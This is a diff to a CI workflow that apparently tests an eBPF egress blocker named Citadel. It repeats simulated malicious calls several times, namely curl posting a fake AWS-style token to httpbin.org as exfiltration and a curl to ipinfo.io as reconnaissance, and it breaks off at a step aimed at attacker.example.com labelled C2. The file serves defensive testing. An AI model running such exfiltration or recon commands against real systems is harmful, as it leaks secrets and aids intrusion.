@@ -59,23 +59,39 @@ jobs:
       # ─────────────────────────────────────────────────────────────────
       # 2) Would-be-malicious calls — these should be BLOCKED.
       # ─────────────────────────────────────────────────────────────────
-      - name: Blocked — httpbin.org (not allowlisted)
+      # NOTE on Citadel's block model:
+      # The agent reacts to outbound connects via kprobe+ringbuf, then inserts
+      # the destination IP into the cgroup_skb/egress block map. By design the
+      # first SYN may sneak through (it raced ahead of userspace); subsequent
+      # packets to the same IP get dropped. So we attempt each destination
+      # multiple times — the first call is the "tip-off", the later calls
+      # should fail with connection refused / timeout.
+
+      - name: Blocked — httpbin.org (3 attempts; later ones should fail)
         run: |
           citadel-step "blocked: httpbin exfil"
-          if curl -sS --max-time 5 https://httpbin.org/post -d "fake_token=AKIAFAKEKEY" 2>&1; then
-            echo "❌ httpbin.org was NOT blocked — policy is wrong or agent is in audit mode"
-          else
-            echo "✅ httpbin.org BLOCKED at kernel (expected)"
-          fi
+          for i in 1 2 3; do
+            echo "--- attempt $i ---"
+            if curl -sS --max-time 4 https://httpbin.org/post -d "fake_token=AKIAFAKEKEY" -o /dev/null -w "  HTTP %{http_code}  (%{time_total}s)\n"; then
+              echo "  ⚠️  attempt $i succeeded"
+            else
+              echo "  ✅ attempt $i blocked (expected for attempt ≥ 2)"
+            fi
+            sleep 2
+          done
 
-      - name: Blocked — ipinfo.io (recon)
+      - name: Blocked — ipinfo.io (3 attempts)
         run: |
           citadel-step "blocked: ipinfo recon"
-          if curl -sS --max-time 5 https://ipinfo.io/json 2>&1; then
-            echo "❌ ipinfo.io was NOT blocked"
-          else
-            echo "✅ ipinfo.io BLOCKED at kernel (expected)"
-          fi
+          for i in 1 2 3; do
+            echo "--- attempt $i ---"
+            if curl -sS --max-time 4 https://ipinfo.io/json -o /dev/null -w "  HTTP %{http_code}  (%{time_total}s)\n"; then
+              echo "  ⚠️  attempt $i succeeded"
+            else
+              echo "  ✅ attempt $i blocked (expected for attempt ≥ 2)"
+            fi
+            sleep 2
+          done
 
       - name: Blocked — attacker.example.com (C2)
         run: |
